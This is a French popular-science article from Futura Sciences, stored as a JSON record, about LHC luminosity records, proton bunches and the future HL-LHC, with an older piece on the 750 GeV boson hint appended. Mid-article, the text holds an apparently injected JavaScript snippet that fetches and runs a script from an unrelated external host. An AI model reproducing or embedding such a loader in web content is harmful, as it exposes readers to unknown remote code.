{"title": "LHC : de nouveaux records et, peut-etre, une future decouverte", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-03", "content": "Avec le LHC, les physiciens traquent des reactions de production de particules exotiques qui sont tres improbables. Pour augmenter leurs chances de les decouvrir en un temps raisonnable, ils augmentent la luminosite des faisceaux. Recemment, ils ont battu de nouveaux records. Ce qu'il faut retenir Pour augmenter ses chances de gagner au Loto, un joueur peut augmenter le nombre de billets achetes a chaque tirage. Pour un physicien des particules chassant de la nouvelle physique, cela revient a augmenter le nombre de collisions dans un accelerateur. Au Cern, les ingenieurs en charge du LHC ne cessent donc d'augmenter le taux de collisions par seconde, c'est-a-dire la luminosite des faisceaux, afin d'augmenter << la statistique >>, comme disent les chercheurs dans leur jargon. Les derniers records en date concernent le nombre de paquets de protons dans chaque faisceau circulant dans le LHC et le nombre de protons dans ces paquets. LHC : comment fonctionne le plus grand accelerateur de particules ?                       A cheval entre la France et la Suisse, le Grand collisionneur de hadrons permet actuellement de faire des collisions de protons a une energie de 13 TeV (teraelectronvolts). Decouvrez le fonctionnement de cet impressionnant outil en video grace au Cern.                                        Le 23 mai 2017, la collecte de donnees liees aux collisions de faisceaux de  protons  a repris dans les detecteurs du  LHC . Ces faisceaux avaient deja fait leur retour dans le Grand collisionneur de  hadrons  depuis quelque temps deja mais les chercheurs ne s'en servaient pas encore pour tenter de decouvrir de la nouvelle physique, par exemple pour tenter de confirmer l'existence des anomalies qui intriguent les physiciens et qui pourraient indiquer que les  bosons W' ou Z' de la theorie des supercordes  existent bel et bien. Accelerer des protons et s'en servir pour tenter de percer les secrets des arcanes du cosmos est loin d'etre facile. Cela implique de nombreux casse-tete pour les ingenieurs qui veulent repondre aux demandes des physiciens. En effet, pour cela, il est necessaire d'avoir des faisceaux de particules dont les trajectoires sont tres precisement controlees, en temps et en position, alors que ces particules se deplacent presque a la vitesse de la  lumiere . Par ailleurs, ces faisceaux doivent etre denses pour que le nombre de collisions soit eleve ; or, les repulsions electrostatiques entre les protons tendent a diluer les faisceaux. C'est le probleme de la  luminosite  des faisceaux de particules qui est ici en cause. S'ajoute a cela le probleme de la montee en energie necessaire pour faire des decouvertes. En effet, comme l'a montre Einstein, la  masse  est une mesure du contenu en energie d'une particule. Cela veut dire que, si l'on veut creer dix protons avec une collision de deux protons (ou si l'on veut creer une particule nouvelle dont la masse est celle de dix protons), il faut que les deux protons de depart aient une energie cinetique suffisamment elevee pour qu'elle puisse etre transformee par la collision de ces particules. Une chercheuse de l'experience Atlas propose de mieux apprehender l'interpretation statistique des mesures. Qu'est-ce qu'une << fluctuation statistique >> ? Qu'entend-on par 2, 3 ou 5 sigmas ? (c) CEA recherche Augmenter le nombre de collisions par seconde Malheureusement, il ne suffit pas d'avoir assez d'energie pour observer la creation de nouvelles particules. Car, du fait notamment des lois de la  mecanique quantique , des probabilites de reactions entrent aussi en jeu. Ainsi, certaines reactions sont tres peu probables, a tel point que si les physiciens faisaient, par exemple, une collision par seconde entre deux protons, il faudrait attendre un temps excedant de beaucoup la vie humaine pour pourvoir observer la creation d'une seule nouvelle particule predite par de la nouvelle physique. Cette probabilite peut egalement dependre de l'energie atteinte mais le parametre sur lequel les chercheurs doivent le plus souvent jouer, une fois le seuil d'energie de creation atteint, est celui du nombre de collisions par seconde. Si celui-ci devient, par exemple, de plusieurs milliards de milliards, les chances d'observer quelque chose de nouveau sont augmentees.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Cette situation peut etre comparee au temps de pose necessaire pour obtenir une photo de bonne qualite : lorsque la luminosite de la source est faible, le temps de pose est long. Inversement, lorsque la luminosite de la source est importante (c'est-a-dire le flux de photons, donc la luminosite de ce flux), le temps de pose est court. Ce concept a ete transpose a la physique des particules ; il est ainsi question de la << luminosite d'un faisceau >>. C'est d'autant plus approprie qu'il ne faut pas oublier que  Louis de Broglie  nous a montre, en decouvrant theoriquement les ondes de matiere, qu'il y avait aussi un aspect ondulatoire associe aux particules de matiere, tout comme il y a un aspect corpusculaire associe aux ondes lumineuses. Dans le cas du LHC, les ingenieurs veulent sans cesse augmenter cette luminosite. Un recent  communique  fait etat d'un nouveau record. Comment decouvrir de nouvelles particules ? (c) Cern, 1989 Un LHC a haute luminosite a l'horizon 2025 Il faut savoir que, pour diverses raisons, les faisceaux de particules sont constitues de paquets appeles des << bunches >>. Augmenter la luminosite du LHC, cela veut dire augmenter le nombre de protons dans ces bunches et augmenter le nombre de paquets dans la circonference du LHC. Depuis la semaine derniere, les chercheurs peuvent produire dans le LHC des faisceaux avec 2.556 bunches contenant chacun environ 100 milliards de protons. Ces bunches sont espaces de 7 metres et, etant donne leur vitesse, il en passe un toutes les 25 nanosecondes en un point du LHC. Deux records sont ainsi battus : celui du nombre de bunches par faisceau et celui du nombre de protons par bunches. Le Cern ne compte pas en rester la. Ses membres planchent sur un successeur du Grand collisionneur de hadrons a haute luminosite, le  HL-LHC . Si tout se passe comme prevu, la luminosite du nouveau LHC devrait etre multipliee par 10 a l'horizon 2025. En pratique, cela signifie par exemple qu'il produira chaque annee 15 millions de bosons de  Brout-Englert-Higgs , contre 1,2 million produits par le LHC entre 2011 et 2012. Pour en savoir plus A quand la decouverte d'une nouvelle physique ? Article de Laurent Sacco paru le 07/06/2016 L'annee derniere, un nouveau  boson  avait pointe le bout de son  nez  dans les donnees collectees par le LHC (le Grand collisionneur de hadrons). Alors, existe-t-il reellement ? Le suspense est a son  comble  et la chasse se poursuit avec des taux de collisions record. Avant d'entrer dans le  LHC  (le Grand collisionneur de hadrons, ou  Large Hadron Collider,  en anglais), les protons destines a y atteindre des  energies  de 13 TeV subissent toute une serie de pre-accelerations avec differentes machines. L'une d'elle est le Synchrotron a protons (ou PS, l'acronyme de  Proton Synchrotron , en anglais). Il a ete mis en service en 1959, si bien qu'en 2009 on a fete son cinquantenaire en presence de nombreux  prix Nobel , comme Futura-Sciences vous l'avait alors relate. Il y a un peu plus d'une semaine, il est tombe en panne, ce qui a conduit le Cern a interrompre le  second run  pendant quelques jours. Cela n'aura toutefois pas d' incidence  sur la chasse au  nouveau boson . Celui-ci semble en effet pointer le bout de son nez dans les detecteurs Atlas et CMS. Sa masse serait d'environ 750 fois celle d'un  proton , donc de 750  GeV , comme disent les physiciens dans leur jargon. Cette chasse est, bien sur, effectuee en tenant compte des principes qui gouvernent le  monde quantique . De gauche a droite : Rolf-Dieter Heuer (l'ancien directeur du Cern), Leon Lederman, Lyndon Evans, Jerome Friedman, Burton Richter, Gerardus 't Hooft, Sheldon Glashow, Martinus Veltman et David Gross. Ils etaient reunis en decembre 2009 pour feter les cinquante ans du Synchrotron a protons (PS) du Cern. (c) Jean-Claude Gadmer,Cern                               Des collisions de protons pendant un temps record Avant l'incident lie au Synchrotron a protons, les ingenieurs et physiciens en charge du LHC au  Cern  avaient reussi a produire le plus long temps de collisions avec des faisceaux de protons dans le geant de 27 kilometres de circonference, a savoir 35,5 heures. Ce record est tres encourageant car il permet d'envisager le futur du LHC avec confiance. En effet, les travaux d'amelioration qui lui ont permis d'atteindre des energies de 13 TeV et d'augmenter la luminosite des faisceaux ont visiblement porte leurs fruits : la machine semble fonctionner sans reels problemes. La  luminosite , c'est-a-dire, en gros, l'equivalent de la quantite de grains de lumiere traversant par seconde une surface donnee, mais ici avec des protons, est en train d'atteindre des records. Les faisceaux contiennent maintenant 2.040 << bunches >>, c'est-a-dire des paquets de particules, et ceux-ci contiennent en moyenne 100 milliards de protons. La  frequence  des collisions (et donc le nombre de collisions par seconde), en devenant de plus en plus elevee, permet d'esperer la decouverte rapide des processus de creation de nouvelles particules rares. Si cette frequence n'est pas suffisamment importante, cela pourrait malheureusement necessiter des decennies de fonctionnement du LHC, voire bien plus. Toujours est-il qu'actuellement ce que les chercheurs appellent << la luminosite integree >>, c'est-a-dire la luminosite cumulee sur une periode donnee, a depasse cette annee 1 femtobarn inverse en debut de semaine, soit un quart de la luminosite enregistree pendant toute l'annee 2015.  ", "theme": "sciences"}